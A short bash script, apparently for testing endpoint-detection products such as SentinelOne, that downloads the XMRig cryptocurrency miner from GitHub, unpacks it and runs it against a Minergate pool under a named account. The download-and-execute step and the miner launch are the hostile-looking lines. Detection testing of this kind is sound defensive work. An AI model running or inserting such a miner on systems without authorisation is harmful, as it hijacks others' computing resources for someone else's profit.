#!/bin/bash

# Some variables to make colorized output easier to manage..
Color_Off='\033[0m'       # Text Resets
# Regular Colors
Black='\033[0;30m'        # Black
Red='\033[0;31m'          # Red
Green='\033[0;32m'        # Green
Yellow='\033[0;33m'       # Yellow
Blue='\033[0;34m'         # Blue
Purple='\033[0;35m'       # Purple
Cyan='\033[0;36m'         # Cyan
White='\033[0;37m'        # White

function cyan_output() {
    printf "\n${Cyan}$1\n${Color_Off}"
}

#NOTE: XMRig binary will be detected by SentinelOne Cloud
#NOTE: It will also be detected by Behavioral AI (if not mitigated by S1 Cloud detection)
cyan_output "Downloading XMRig archive from GitHub..."
curl -sLO https://github.com/xmrig/xmrig/releases/download/v6.19.2/xmrig-6.19.2-linux-x64.tar.gz
tar -xvf xmrig-6.19.2-linux-x64.tar.gz
cd xmrig-6.19.2

cyan_output "Executing XMRig..."
./xmrig "--cpu-max-threads-hint=10" "-o" "xmr.pool.minergate.com:45700" "-u" "cash4@johnny-ataquero.io" "-p" "x" "-k"